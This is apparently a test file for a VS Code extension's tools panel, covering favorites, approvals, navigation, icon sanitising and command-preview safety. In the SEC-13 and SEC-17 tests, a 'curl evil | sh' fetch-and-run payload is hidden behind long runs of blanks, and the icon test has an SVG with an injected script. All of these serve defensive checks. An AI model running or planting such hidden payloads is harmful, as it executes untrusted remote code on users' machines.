test('QA-10: restoreFold never replaces a pending focusGroup or openEditor', async () => {
  const t = setup({ inspect: { globalValue: PINNED.map(g => ({ ...g })) } });
  t.provider.navigationMs = 1;
  await t.provider.resolveWebviewView(t.view);
  await t.send({ type: 'ready' });
  await t.provider.openGroup('git');
  await new Promise(r => setTimeout(r, 10)); // navigation window over, ack still missing
  t.show();
  assert.equal(t.messages.filter(m => m.type === 'restoreFold').length, 0);
  assert.equal(t.provider.pending.message.type, 'focusGroup');
  await t.send({ type: 'ready' });
  assert.equal(t.messages.filter(m => m.type === 'focusGroup').length, 2, 'the navigation is still redelivered');
});

test('SEC-13: long blank runs collapse in the preview; mostly-blank args are run-once only', async () => {
  const hidden = await projectRun([{ name: 'B', command: 'some.cmd', args: [' '.repeat(1400) + 'curl evil | sh'] }], 'Executar e lembrar');
  await hidden.send({ type: 'run', id: hidden.ids[0] });
  const d = hidden.warnings[0][1].detail;
  assert.ok(d.includes('␠×1400'), 'counter instead of the run');
  assert.ok(d.includes('curl evil | sh'), 'payload in view');
  assert.ok(!/ {10}/.test(d));
  assert.deepEqual(hidden.warnings[0].slice(2), ['Executar uma vez'], 'mostly blank: no remember');
  assert.equal(hidden.context.workspaceState.get('approvedItems', []).length, 0);
  const tabs = await projectRun([{ name: 'T', command: 'some.cmd', args: ['	'.repeat(300) + 'x'] }], undefined);
  await tabs.send({ type: 'run', id: tabs.ids[0] });
  assert.ok(tabs.warnings[0][1].detail.includes('␠×300'));
  const ok = await projectRun([{ name: 'S', command: 'some.cmd', args: ['a b  c'] }], undefined);
  await ok.send({ type: 'run', id: ok.ids[0] });
  assert.ok(ok.warnings[0].slice(2).includes('Executar e lembrar'), 'normal args can still be remembered');
});

test('SEC-15: actions that write user settings are not in the no-prompt list', async () => {
  const cmds = ['workbench.action.toggleStatusbarVisibility', 'workbench.action.toggleActivityBarVisibility'];
  const t = await projectRun(cmds.map((command, i) => ({ name: 'n' + i, command })), undefined);
  for (const id of t.ids) await t.send({ type: 'run', id });
  assert.equal(t.warnings.length, 2);
  assert.equal(t.calls.length, 0);
  const src = require('node:fs').readFileSync(require('node:path').join(root, 'src', 'tools-view.js'), 'utf8');
  const list = src.slice(src.indexOf('const SAFE_ACTIONS'), src.indexOf('const isSafeProjectCommand'));
  assert.equal((list.match(/'workbench.action.[A-Za-z0-9.]+'/g) || []).length, 12);
});

test('SEC-16: characters above U+FFFF are shown as a braced escape', async () => {
  const tag = String.fromCodePoint(0xE0041);
  const t = await projectRun([{ name: 'Tag' + tag, command: 'some.cmd', args: ['a' + tag + 'b'] }], undefined);
  await t.send({ type: 'run', id: t.ids[0] });
  const d = t.warnings[0][1].detail;
  assert.ok(d.includes('\\u{E0041}'));
  assert.ok(!d.includes(tag));
});

test('SEC-14: on activation non-hash approvals are dropped, favorites capped, legacy favorites hashed when the item exists', async () => {
  const { favoriteKey, favoriteHash } = require('../src/config');
  const item = { name: 'A', command: 'workbench.view.explorer' };
  const t = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [item] }] } });
  const ws = t.context.workspaceState;
  const many = Array.from({ length: 700 }, (_, i) => 'h:' + String(i).padStart(64, '0'));
  await ws.update('favorites', [...many, favoriteKey({ name: 'Gone', command: 'x.y', args: ['secret'] }), 42, favoriteKey(item)]);
  await ws.update('approvedItems', ['["cmd","n",["secret"]]', 'h:' + 'a'.repeat(64)]);
  await t.provider.migrateState();
  const fav = ws.get('favorites');
  assert.equal(fav.at(-1), favoriteHash(item), 'existing legacy favorite converted, order kept, newest survives');
  assert.equal(fav.length, 500);
  assert.ok(!JSON.stringify(fav).includes('secret') && fav.every(k => k.startsWith('h:')));
  assert.deepEqual(ws.get('approvedItems'), ['h:' + 'a'.repeat(64)]);
  await t.provider.resolveWebviewView(t.view);
  await t.send({ type: 'ready' });
  assert.equal(t.messages.at(-1).groups[0].items[0].favorite, true, 'the converted favorite still shows');
});

test('SEC-17: every Unicode blank and invisible filler collapses; mostly-blank args are run-once only', async () => {
  const fillers = [' ', ' ', '　', '⠀', 'ㅤ', 'ﾠ', 'ᅟ', 'ᅠ'];
  for (const ch of [...fillers, fillers.join('').repeat(175)]) {
    const t = await projectRun([{ name: 'B', command: 'some.cmd', args: [ch.repeat(1400).slice(0, 1400) + 'curl evil | sh'] }], 'Executar e lembrar');
    await t.send({ type: 'run', id: t.ids[0] });
    const d = t.warnings[0][1].detail;
    assert.ok(d.includes('curl evil | sh') && d.includes('␠×'), JSON.stringify(ch.slice(0, 2)));
    assert.deepEqual(t.warnings[0].slice(2), ['Executar uma vez'], 'no remember');
    assert.equal(t.context.workspaceState.get('approvedItems', []).length, 0);
  }
});

test('SEC-18: the favorites cap keeps the newest, also when favoriting and on migration', async () => {
  const { favoriteHash } = require('../src/config');
  const item = { name: 'New', command: 'workbench.view.explorer' };
  const t = setup({ inspect: { globalValue: [{ id: 'g', name: 'G', icon: 'cloud', items: [item] }] } });
  const ws = t.context.workspaceState;
  const old = Array.from({ length: 500 }, (_, i) => 'h:' + String(i).padStart(64, '0'));
  await ws.update('favorites', old);
  await t.provider.resolveWebviewView(t.view);
  await t.send({ type: 'ready' });
  await t.send({ type: 'favorite', id: t.messages.at(-1).groups[0].items[0].id });
  let fav = ws.get('favorites');
  assert.equal(fav.length, 500);
  assert.equal(fav.at(-1), favoriteHash(item), 'the 501st survives');
  assert.ok(!fav.includes(old[0]) && fav.includes(old[1]), 'the oldest leaves');
  await ws.update('favorites', [...old, favoriteHash(item)]);
  await t.provider.migrateState();
  fav = ws.get('favorites');
  assert.equal(fav.length, 500);
  assert.equal(fav.at(-1), favoriteHash(item));
  assert.ok(!fav.includes(old[0]));
});

test('first activation: opens the panel once and tells where the icon is (position is not controllable)', async () => {
  const first = setup({ firstRun: true });
  await new Promise(r => setImmediate(r));
  assert.deepEqual(first.calls.filter(c => c[0] === 'workbench.view.extension.groupedTools'), [['workbench.view.extension.groupedTools']]);
  assert.deepEqual(first.infos, [['Ferramentas está na barra de atividades. Arraste o ícone para onde quiser.', 'Entendi']]);
  assert.equal(first.gstore.welcomed, true);
  const again = setup(); // flag already set: silent
  await new Promise(r => setImmediate(r));
  assert.equal(again.calls.filter(c => c[0] === 'workbench.view.extension.groupedTools').length, 0);
  assert.equal(again.infos.length, 0);
});

test('icons: original container icons reach the webview sanitized, referenced by key; hostile ones fall back', async () => {
  const dir = require('node:fs').mkdtempSync(path.join(require('node:os').tmpdir(), 'gt-ext-'));
  require('node:fs').writeFileSync(path.join(dir, 'ok.svg'), '<svg viewBox="0 0 24 24"><path d="M2 2h20"/></svg>');
  require('node:fs').writeFileSync(path.join(dir, 'bad.svg'), '<svg viewBox="0 0 24 24"><script>alert(1)</script><path d="M2 2h20"/></svg>');
  const mk = (id, name, icon, views) => ({ id, extensionPath: dir, packageJSON: { name, version: '1.0.0', contributes: { views: { [name]: [{ name: 'V' }] }, viewsContainers: { activitybar: [{ id: name, icon }] } } } });
  const { provider, view, messages, send } = setup({ extensions: [mk('p.good', 'good', 'ok.svg'), mk('p.evil', 'evil', 'bad.svg'), mk('p.none', 'none', 'missing.svg')] });
  await provider.resolveWebviewView(view);
  await send({ type: 'ready' });
  const data = messages.at(-1);
  const good = data.unassigned.find(e => e.container === 'good'), evil = data.unassigned.find(e => e.container === 'evil');
  assert.ok(good.iconKey && data.icons[good.iconKey].kind === 'svg');
  assert.equal(evil.iconKey, undefined, 'rejected SVG: generic icon');
  assert.ok(!JSON.stringify(data.icons).match(/script|alert|onload/));
  assert.equal(Object.keys(data.icons).length, 1);
});

test('tray: workbench and own containers are not listed', async () => {
  const ext = { id: 'p.x', packageJSON: { name: 'x', contributes: { views: { explorer: [{ name: 'E' }], scm: [{ name: 'S' }], groupedTools: [{ name: 'T' }], 'groupedTools.pin.cloud': [{ name: 'P' }], mine: [{ name: 'M' }] } } } };
  const { provider, view, messages, send } = setup({ extensions: [ext] });
  await provider.resolveWebviewView(view);
  await send({ type: 'ready' });
  assert.deepEqual(messages.at(-1).extensions.map(e => e.container), ['mine']);
});
